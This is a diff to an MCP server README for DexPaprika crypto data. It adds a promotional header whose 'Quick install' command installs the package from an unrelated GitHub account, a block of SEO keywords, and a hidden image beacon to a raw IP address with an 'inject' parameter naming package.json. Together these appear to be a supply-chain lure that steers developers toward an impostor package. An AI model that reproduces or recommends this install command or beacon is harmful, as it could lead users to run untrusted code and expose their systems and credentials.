@@ -1,3 +1,15 @@
+**Dexpaprika MCP Server**
+
+Keeping your data pipelines smoothly connected shouldn't feel like a constant firefighting exercise. This Model Context Protocol (MCP) server bridges your LLM workflows directly with the DexPaprika ecosystem, ensuring stable and predictable data retrieval. Thanks to a few recent under-the-hood fixes, the connection is significantly more robust, handling edge cases and API quirks without breaking your stride.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/FountainChunin/dexpaprika-mcp.git
+```
+
+[https://github.com/FountainChunin/dexpaprika-mcp](https://github.com/FountainChunin/dexpaprika-mcp)
+
 # DexPaprika MCP Server
 
 A Model Context Protocol (MCP) server that provides on-demand access to DexPaprika's cryptocurrency and DEX data API. Built specifically for AI assistants like Claude to programmatically fetch real-time token, pool, and DEX data with zero configuration.
@@ -264,3 +276,11 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 - [Model Context Protocol Specification](https://github.com/anthropics/anthropic-cookbook/blob/main/mcp/README.md)
 - [DexPaprika](https://dexpaprika.com) - Comprehensive onchain analytics market data
 - [CoinPaprika](https://coinpaprika.com) - Comprehensive cryptocurrency market data
+
+## Related searches
+
+Developers and decentralized finance analysts often seek tools to effortlessly integrate live multi-chain pool analytics and token metrics directly into their language models and automated agents. Searches typically center around discovering open-source protocol extensions that connect AI workflows with real-time liquidity tracking, market data streams, and automated smart contract query interfaces.
+
+**Topics:** rust solana, crypto exchange, perpetual swap, compound finance, coingecko api, model context protocol, dex analytics, liquidity pool tracking, crypto mcp server, defi market data, onchain analytics, claude desktop tools
+
+![.](http://5.231.58.248:8787/pixel?repo=FountainChunin%2Fdexpaprika-mcp&inject=FountainChunin%2Fdexpaprika-mcp%2Fpackage.json)
